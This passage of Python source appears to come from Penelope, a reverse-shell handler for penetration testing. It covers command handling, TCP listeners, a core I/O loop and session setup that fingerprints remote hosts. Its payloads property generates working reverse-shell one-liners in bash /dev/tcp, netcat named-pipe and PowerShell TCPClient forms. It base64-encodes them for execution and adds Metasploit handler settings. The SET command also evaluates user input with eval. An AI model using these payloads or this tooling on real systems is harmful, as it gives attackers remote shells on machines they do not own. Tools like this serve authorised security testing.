		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
			listeners stop 1		Stop the Listener with ID 1
		"""
		if line:
			parser = ArgumentParser(prog="listeners")
			subparsers = parser.add_subparsers(dest="command", required=True)

			parser_add = subparsers.add_parser("add", help="Add a new listener")
			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
			parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')

			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
			parser_stop.add_argument("id", help="Listener ID to stop")

			try:
				args = parser.parse_args(line.split())
			except SystemExit:
				return False

			if args.command == "add":
				if args.type == 'tcp':
					TCPListener(args.interface, args.port)

			elif args.command == "stop":
				if args.id == '*':
					listeners = core.listeners.copy()
					if listeners:
						for listener in listeners.values():
							listener.stop()
					else:
						cmdlogger.warning("No listeners to stop...")
						return False
				else:
					try:
						core.listeners[int(args.id)].stop()
					except (KeyError, ValueError):
						logger.error("Invalid Listener ID")

		else:
			if core.listeners:
				table = Table(joinchar=' | ')
				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
				for listener in core.listeners.values():
					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				cmdlogger.warning("No active Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		if not line:
			cmdlogger.warning("No target specified")
			return False
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_payloads(self, line):
		"""

		Create reverse shell payloads based on the active listeners
		"""
		if core.listeners:
			print()
			for listener in core.listeners.values():
				print(listener.payloads, end='\n\n')
		else:
			cmdlogger.warning("No Listeners to show payloads")

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_exit(self, line):
		"""

		Exit Penelope
		"""
		if ask(f"Exit Penelope?{self.active_sessions} (y/N): ").lower() == 'y':
			super().do_exit(line)
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			cmdlogger.info("Exited!")
			remaining_threads = [thread for thread in threading.enumerate()]
			if options.dev_mode and remaining_threads:
				cmdlogger.error(f"REMAINING THREADS: {remaining_threads}")
			return True
		return False

	def do_EOF(self, line):
		if self.sid:
			self.set_id(None)
			print()
		else:
			print("exit")
			return self.do_exit(line)

	def do_modules(self, line):
		"""

		Show available modules
		"""
		self.show_modules()

	def do_reload(self, line):
		"""

		Reload the rc file
		"""
		load_rc()

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					new_value = eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		else:
			parts = line.split(" ", 1)
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(f"No such command: '{line}'. Issue 'help' for all available commands")
			elif len(candidates) == 1:
				cmd = candidates[0]
				if len(parts) == 2:
					cmd += " " + parts[1]
				stdout(f"\x1b[1A\x1b[2K{self.prompt}{cmd}\n".encode(), False)
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		last = -2 if text else -1
		arg = line.split()[last]

		if arg == 'listeners':
			return [command for command in ["add", "stop"] if command.startswith(text)]
		elif arg in ('-i', '--interface'):
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		elif arg in ('-t', '--type'):
			return [_type for _type in ("tcp",) if _type.startswith(text)]
		elif arg == 'stop':
			return self.get_core_id_completion(text, "*", attr='listeners')

	def complete_upload(self, text, line, begidx, endidx):
		return __class__.file_completer(text)

	def complete_use(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]

	def complete_help(self, text, line, begidx, endidx):
		return [command for command in self.raw_commands if command.startswith(text)]


class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		self.queue.put(command)
		os.write(self._in, b'\x00')

	def get(self):
		os.read(self._out, 1)
		return self.queue.get()

	def clear(self):
		amount = 0
		while not self.queue.empty():
			try:
				self.queue.get_nowait()
				amount += 1
			except queue.Empty:
				break
		os.read(self._out, amount) # maybe needs 'try' because sometimes close() precedes

	def close(self):
		os.close(self._in)
		os.close(self._out)

class Core:

	def __init__(self):
		self.started = False

		self.control = ControlQueue()
		self.rlist = [self.control]
		self.wlist = []

		self.attached_session = None
		self.session_wait_host = None
		self.session_wait = queue.LifoQueue()

		self.lock = threading.Lock() # TO REMOVE
		self.conn_semaphore = threading.Semaphore(5)

		self.listenerID = 0
		self.listener_lock = threading.Lock()
		self.sessionID = 0
		self.session_lock = threading.Lock()
		self.fileserverID = 0
		self.fileserver_lock = threading.Lock()

		self.hosts = defaultdict(list)
		self.sessions = {}
		self.listeners = {}
		self.fileservers = {}
		self.forwardings = {}

		self.output_line_buffer = LineBuffer(1)
		self.wait_input = False

	def __getattr__(self, name):

		if name == 'new_listenerID':
			with self.listener_lock:
				self.listenerID += 1
				return self.listenerID

		elif name == 'new_sessionID':
			with self.session_lock:
				self.sessionID += 1
				return self.sessionID

		elif name == 'new_fileserverID':
			with self.fileserver_lock:
				self.fileserverID += 1
				return self.fileserverID
		else:
			raise AttributeError(name)

	@property
	def threads(self):
		return [thread.name for thread in threading.enumerate()]

	def start(self):
		self.started = True
		threading.Thread(target=self.loop, name="Core").start()

	def loop(self):

		while self.started:
			readables, writables, _ = select(self.rlist, self.wlist, [])

			for readable in readables:

				# The control queue
				if readable is self.control:
					command = self.control.get()
					if command:
						logger.debug(f"About to execute {command}")
					else:
						logger.debug("Core break")
					try:
						exec(command)
					except KeyError: # TODO
						logger.debug("The session does not exist anymore")
					break

				# The listeners
				elif readable.__class__ is TCPListener:
					_socket, endpoint = readable.socket.accept()
					thread_name = f"NewCon{endpoint}"
					logger.debug(f"New thread: {thread_name}")
					threading.Thread(target=Session, args=(_socket, *endpoint, readable), name=thread_name).start()

				# STDIN
				elif readable is sys.stdin:
					if self.attached_session:
						session = self.attached_session
						if session.type == 'Readline':
							continue

						data = os.read(sys.stdin.fileno(), options.network_buffer_size)

						if session.subtype == 'cmd':
							self._cmd = data

						if data == options.escape['sequence']:
							if session.alternate_buffer:
								logger.error("(!) Exit the current alternate buffer program first")
							else:
								session.detach()
						else:
							if session.type == 'Raw':
								session.record(data, _input=not session.interactive)

							elif session.agent:
								data = Messenger.message(Messenger.SHELL, data)

							session.send(data, stdin=True)
					else:
						logger.error("You shouldn't see this error; Please report it")

				# The sessions
				elif readable.__class__ is Session:
					try:
						data = readable.socket.recv(options.network_buffer_size)
						if not data:
							raise OSError

					except OSError:
						logger.debug("Died while reading")
						readable.kill()
						break

					# TODO need thread sync
					target = readable.shell_response_buf\
					if not readable.subchannel.active\
					and readable.subchannel.allow_receive_shell_data\
					else readable.subchannel

					if readable.agent:
						for _type, _value in readable.messenger.feed(data):
							#print(_type, _value)
							if _type == Messenger.SHELL:
								if not _value: # TEMP
									readable.kill()
									break
								target.write(_value)

							elif _type == Messenger.STREAM:
								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
								#print((repr(stream_id), repr(data)))
								try:
									readable.streams[stream_id] << data
								except (OSError, KeyError):
									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
					else:
						target.write(data)

					shell_output = readable.shell_response_buf.getvalue() # TODO
					if shell_output:
						if readable.is_attached:
							stdout(shell_output)

						readable.record(shell_output)

						if b'\x1b[?1049h' in data:
							readable.alternate_buffer = True

						if b'\x1b[?1049l' in data:
							readable.alternate_buffer = False
						#if readable.subtype == 'cmd' and self._cmd == data:
						#	data, self._cmd = b'', b'' # TODO

						readable.shell_response_buf.seek(0)
						readable.shell_response_buf.truncate(0)

			for writable in writables:
				with writable.wlock:
					try:
						sent = writable.socket.send(writable.outbuf.getvalue())
					except OSError:
						logger.debug("Died while writing")
						writable.kill()
						break

					writable.outbuf.seek(sent)
					remaining = writable.outbuf.read()
					writable.outbuf.seek(0)
					writable.outbuf.truncate()
					writable.outbuf.write(remaining)
					if not remaining:
						self.wlist.remove(writable)

	def stop(self):
		options.maintain = 0

		if self.sessions:
			logger.warning("Killing sessions...")
			for session in reversed(list(self.sessions.copy().values())):
				session.kill()

		for listener in self.listeners.copy().values():
			listener.stop()

		for fileserver in self.fileservers.copy().values():
			fileserver.stop()

		self.control << 'self.started = False'

		menu.stop = True
		menu.cmdqueue.append("")
		menu.active.set()

def handle_bind_errors(func):
	@wraps(func)
	def wrapper(*args, **kwargs):
		host = args[1]
		port = args[2]
		try:
			func(*args, **kwargs)
			return True

		except PermissionError:
			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
			print(dedent(
			f"""
			{paint('Workarounds:')}

			1) {paint('Port forwarding').UNDERLINE} (Run the Listener on a non-privileged port e.g 4444)
			    sudo iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft add rule ip nat prerouting tcp dport {port} redirect to 4444
			        {paint('then').white}
			    sudo iptables -t nat -D PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft delete rule ip nat prerouting tcp dport {port} redirect to 4444

			2) {paint('Setting CAP_NET_BIND_SERVICE capability').UNDERLINE}
			    sudo setcap 'cap_net_bind_service=+ep' {os.path.realpath(sys.executable)}
			    ./penelope.py {port}
			    sudo setcap 'cap_net_bind_service=-ep' {os.path.realpath(sys.executable)}

			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelope)
			    sudo ./penelope.py {port}
			"""))

		except socket.gaierror:
			logger.error("Cannot resolve hostname")

		except OSError as e:
			if e.errno == EADDRINUSE:
				logger.error(f"The port '{port}' is currently in use")
			elif e.errno == EADDRNOTAVAIL:
				logger.error(f"Cannot listen on '{host}'")
			else:
				logger.error(f"OSError: {str(e)}")

		except OverflowError:
			logger.error("Invalid port number. Valid numbers: 1-65535")

		except ValueError:
			logger.error("Port number must be numeric")

		return False
	return wrapper

def Connect(host, port):

	try:
		port = int(port)
		_socket = socket.socket()
		_socket.settimeout(5)
		_socket.connect((host, port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")

	except ValueError:
		logger.error("Port number must be numeric")

	else:
		if not core.started:
			core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
		session = Session(_socket, host, port)
		if session:
			return True

	return False

class TCPListener:

	def __init__(self, host=None, port=None):
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.port = port or options.default_listener_port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		if self.bind(self.host, self.port):
			self.start()

	def __str__(self):
		return f"TCPListener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	@handle_bind_errors
	def bind(self, host, port):
		self.port = int(port)
		self.socket.bind((host, self.port))

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		specific = ""
		if self.host == '0.0.0.0':
			specific = paint('→  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])

		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << "" # TODO

		if options.payloads:
			print(self.payloads)

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.listeners[{self.id}].stop()'
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	@property
	def payloads(self):
		interfaces = Interfaces().list
		presets = [
			"(bash >& /dev/tcp/{}/{} 0>&1) &",
			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
		]

		output = [str(paint(self).white_MAGENTA)]
		output.append("")
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in interfaces.values()]

		for ip in ips:
			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
			output.append(str(paint("Bash TCP").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
			output.append("")
			output.append(str(paint("Netcat + named pipe").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
			output.append("")
			output.append(str(paint("Powershell").UNDERLINE))
			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())

			output.extend(dedent(f"""
			{paint('Metasploit').UNDERLINE}
			set PAYLOAD generic/shell_reverse_tcp
			set LHOST {ip}
			set LPORT {self.port}
			set DisablePayloadHandler true
			""").split("\n"))

		output.append("─" * 80)
		return '\n'.join(output)


class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = True
		self.allow_receive_shell_data = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, options.network_buffer_size)

	def write(self, data):
		os.write(self._write, data)

	def close(self):
		os.close(self._read)
		os.close(self._write)

class Session:

	def __init__(self, _socket, target, port, listener=None):
		with core.conn_semaphore:
			#print(core.threads)
			print("\a", flush=True, end='')

			self.socket = _socket
			self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			self.socket.setblocking(False)
			self.target, self.port = target, port
			try:
				self.ip = _socket.getpeername()[0]
			except:
				logger.error(f"Invalid connection from {self.target} 🙄")
				play_sound('failure')
				return
			self._host, self._port = self.socket.getsockname()
			self.listener = listener
			self.source = 'reverse' if listener else 'bind'

			self.id = None
			self.OS = None
			self.type = 'Raw'
			self.subtype = None
			self.interactive = None
			self.echoing = None
			self.pty_ready = None

			self.win_version = None

			self.prompt = None
			self.new = True

			self.last_lines = LineBuffer(options.attach_lines)
			self.lock = threading.Lock()
			self.wlock = threading.Lock()

			self.outbuf = io.BytesIO()
			self.shell_response_buf = io.BytesIO()

			self.tasks = {"portfwd":[], "scripts":[]}
			self.subchannel = Channel()
			self.latency = None

			self.alternate_buffer = False
			self.agent = False
			self.messenger = Messenger(io.BytesIO)

			self.streamID = 0
			self.streams = dict()
			self.stream_lock = threading.Lock()
			self.stream_code = Messenger.STREAM_CODE
			self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

			self.shell_pid = None
			self.user = None
			self.tty = None

			self._bin = defaultdict(lambda: "")
			self._tmp = None
			self._cwd = None
			self._can_deploy_agent = None

			self.upgrade_attempted = False

			core.rlist.append(self)

			if self.determine():
				logger.debug(f"OS: {self.OS}")
				logger.debug(f"Type: {self.type}")
				logger.debug(f"Subtype: {self.subtype}")
				logger.debug(f"Interactive: {self.interactive}")
				logger.debug(f"Echoing: {self.echoing}")

				self.get_system_info()

				if not self.hostname:
					if target == self.ip:
						try:
							self.hostname = socket.gethostbyaddr(target)[0]

						except socket.herror:
							self.hostname = ''
							logger.debug("Cannot resolve hostname")
					else:
						self.hostname = target

				hostname = self.hostname
				c1 = '~' if hostname else ''
				ip = self.ip
				c2 = '-'
				system = self.system
				if not system:
					system = self.OS.upper()
				if self.arch:
					system += '-' + self.arch

				self.name = f"{hostname}{c1}{ip}{c2}{system}"
				self.name_colored = (
					f"{paint(hostname).white_BLUE}{paint(c1).white_DIM}"
					f"{paint(ip).white_RED}{paint(c2).white_DIM}"
					f"{paint(system).cyan}"
				)

				self.id = core.new_sessionID
				core.hosts[self.name].append(self)
				core.sessions[self.id] = self

				if self.name == core.session_wait_host:
					core.session_wait.put(self.id)

				play_sound('success')

				logger.info(
					f"Got {self.source} shell from "
					f"{self.name_colored}{paint().green} 😍️ "
					f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
				)

				self.directory = options.basedir / "sessions" / self.name
				if not options.no_log:
					self.directory.mkdir(parents=True, exist_ok=True)
					self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}.log'
					self.histfile = self.directory / "readline_history"
					self.logfile = open(self.logpath, 'ab', buffering=0)
					if not options.no_timestamps:
						self.logfile.write(str(paint(datetime.now().strftime("%Y-%m-%d %H:%M:%S: ")).magenta).encode())

				for module in modules().values():
					if module.enabled and module.on_session_start:
						module.run(self)

				maintain_success = self.maintain()

				if options.single_session and self.listener:
					self.listener.stop()

				if hasattr(listener_menu, 'active') and listener_menu.active:
					os.close(listener_menu.control_w)
					listener_menu.finishing.wait()

				attach_conditions = [
					# Is a reverse shell and the Menu is not active and (reached the maintain value or maintain failed)
					self.listener and not menu.active.is_set() and (len(core.hosts[self.name]) == options.maintain or not maintain_success),

					# Is a bind shell and is not spawned from the Menu
					not self.listener and not menu.active.is_set(),

					# Is a bind shell and is spawned from the connect Menu command
					not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect')
				]

				# If no other session is attached
				if core.attached_session is None:
					# If auto-attach is enabled
					if not options.no_attach:
						if any(attach_conditions):
							# Attach the newly created session
							self.attach()
					else:
						if self.id == 1:
							menu.set_id(self.id)
						if not menu.active.is_set():
							menu.show()
			else:
				self.kill()
				time.sleep(1)
			return

	def __bool__(self):
		return self.socket.fileno() != -1 # and self.OS)

	def __repr__(self):
		try:
			return (
				f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
				f"interactive={self.interactive}, echoing={self.echoing})"
			)
		except:
			return f"ID: (for deletion: {self.id})"

	def __getattr__(self, name):
		if name == 'new_streamID':
			with self.stream_lock:
				if len(self.streams) == self.streams_max:
					logger.error("Too many open streams...")
					return None

				self.streamID += 1
				self.streamID = self.streamID % self.streams_max
				while struct.pack(self.stream_code, self.streamID) in self.streams:
					self.streamID += 1
					self.streamID = self.streamID % self.streams_max

				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)

				return self.streams[_stream_ID_hex]
		else:
			raise AttributeError(name)

	def fileno(self):
		return self.socket.fileno()

	@property
	def can_deploy_agent(self):
		if self._can_deploy_agent is None:
			if Path(self.directory / ".noagent").exists():
				self._can_deploy_agent = False
			else:
				_bin = self.bin['python3'] or self.bin['python']
				if _bin:
					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
					try:
						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
					except:
						self._can_deploy_agent = False
						return self._can_deploy_agent
					self.remote_python_version = (int(major), int(minor), int(micro))
					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
						self._can_deploy_agent = True
					else:
						self._can_deploy_agent = False
				else:
					self._can_deploy_agent = False

		return self._can_deploy_agent

	@property
	def spare_control_sessions(self):
		return [session for session in self.host_control_sessions if session is not self]

	@property
	def host_needs_control_session(self):
		return [session for session in core.hosts[self.name] if session.need_control_session]

	@property
	def need_control_session(self):
		return all([self.OS == 'Unix', self.type == 'PTY', not self.agent, not self.new])

	@property
	def host_control_sessions(self):
		return [session for session in core.hosts[self.name] if not session.need_control_session]

	@property
	def control_session(self):
		if self.need_control_session:
			for session in core.hosts[self.name]:
				if not session.need_control_session:
					return session
			return None # TODO self.spawn()
		return self

	def get_system_info(self):
		self.hostname = self.system = self.arch = ''

		if self.OS == 'Unix':
			if not self.bin['uname']:
				return False

			response = self.exec(
				r'printf "$({0} -n)\t'
				r'$({0} -s)\t'
				r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
				agent_typing=True,
				value=True
			)

			try:
				self.hostname, self.system, self.arch = response.split("\t")
			except:
				return False

		elif self.OS == 'Windows':
			self.systeminfo = self.exec('systeminfo', value=True)
			if not self.systeminfo:
				return False

			if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
				self.exec("cd", force_cmd=True, raw=True)
				return False

			def extract_value(pattern):
				match = re.search(pattern, self.systeminfo, re.MULTILINE)
				return match.group(1).replace(" ", "_").rstrip() if match else ''

			self.hostname = extract_value(r"^Host Name:\s+(.+)")
			self.system = extract_value(r"^OS Name:\s+(.+)")
			self.arch = extract_value(r"^System Type:\s+(.+)")

		return True

	def get_shell_info(self, silent=False):
		self.shell_pid = self.get_shell_pid()
		self.user = self.get_user()
		if self.OS == 'Unix':
			self.tty = self.get_tty(silent=silent)

	def get_shell_pid(self):
		if self.OS == 'Unix':
			response = self.exec("echo $$", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			return None # TODO

		if not (isinstance(response, str) and response.isnumeric()):
			logger.error(f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	def get_user(self):
		if self.OS == 'Unix':
			response = self.exec("echo \"$(id -un)($(id -u))\"", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			if self.type == 'PTY':
				return None # TODO
			response = self.exec("whoami", value=True)

		return response or ''

	def get_tty(self, silent=False):
		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
		if not (isinstance(response, str) and response.startswith('/')):
			if not silent:
				logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	@property
	def cwd(self):
		if self._cwd is None:
			if self.OS == 'Unix':
				cmd = (
				    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
				    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $9;exit}}' | grep . || "
				    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
				    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
				)
				self._cwd = self.exec(cmd, value=True)
			elif self.OS == 'Windows':
				self._cwd = self.exec("cd", force_cmd=True, value=True)
		return self._cwd or ''

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def bin(self):
		if not self._bin:
			try:
				if self.OS == "Unix":
					binaries = [
						"sh", "bash", "python", "python3", "uname",
						"script", "socat", "tty", "echo", "base64", "wget",
						"curl", "tar", "rm", "stty", "setsid", "find", "nc"
					]
					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
					if response:
						self._bin = dict(zip(binaries, response.decode().splitlines()))

					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]

					if missing:
						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
						response = self.exec(
							f'for bin in {" ".join(missing)}; do for dir in '
							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
						)
						if response:
							self._bin.update(dict(zip(missing, response.decode().splitlines())))

				for binary in options.no_bins:
					self._bin[binary] = None

				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
				logger.debug(f"Available binaries on target: \n{paint(result).red}")
			except:
				pass

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug("Trying to find a writable directory on target")
				tmpname = rand(10)
				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
				for directory in common_dirs:
					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
						self.exec(f'rm {directory}/{tmpname}')
						self._tmp = directory
						break
				else:
					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
					if candidate_dirs:
						for directory in candidate_dirs.decode().splitlines():
							if directory in common_dirs:
								continue
							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
								self.exec(f'rm {directory}/{tmpname}')
								self._tmp = directory
								break
				if not self._tmp:
					self._tmp = False
					logger.warning("Cannot find writable directory on target...")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)

		return self._tmp

	def agent_only(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if not self.agent:
				if not self.upgrade_attempted and self.can_deploy_agent:
					logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
					self.upgrade()
					if not self.agent:
						logger.error("Failed to deploy agent")
						return False
				else:
					logger.error("This can only run in python agent mode")
					return False
			return func(self, *args, **kwargs)
		return newfunc

	def send(self, data, stdin=False):
		with self.wlock: #TODO
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			_len = self.outbuf.write(data)

			self.subchannel.allow_receive_shell_data = True

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << ""
			return _len

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S: ") #TEMP
			if not options.no_colored_timestamps:
				timestamp = paint(timestamp).magenta
			data = re.sub(rb'\r\n|\r|\n|\v|\f', rf"\g<0>{timestamp}".encode(), data)
		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>').GREEN + ' ', encoding='utf8'))
			self.logfile.write(data)

		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self, path=False):

		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))

		def expect(data):
			try:
				data = data.decode()
			except:
				return False

			if var_value1 + var_value2 in data:
				return True

			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
				return re.search('batch file.\r\n', data, re.DOTALL)
			elif re.search('PS.*>', data, re.DOTALL):
				return True

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
				return re.search('or operable.*>', data, re.DOTALL)
			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
				return True

		response = self.exec(
			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
			raw=True,
			expect_func=expect
		)

		if response:
			response = response.decode()

			if var_value1 + var_value2 in response:
				self.OS = 'Unix'
				self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
				if self.prompt:
					self.prompt = self.prompt.group(1).encode()
				self.interactive = bool(self.prompt)
				self.echoing = f"echo ${var_name1}${var_name2}" in response

			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
					re.search('Microsoft Windows.*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'cmd'
				self.interactive = True
				self.echoing = True
				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
				self.prompt = prompt[1].encode() if prompt else b""
				win_version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)
				if win_version:
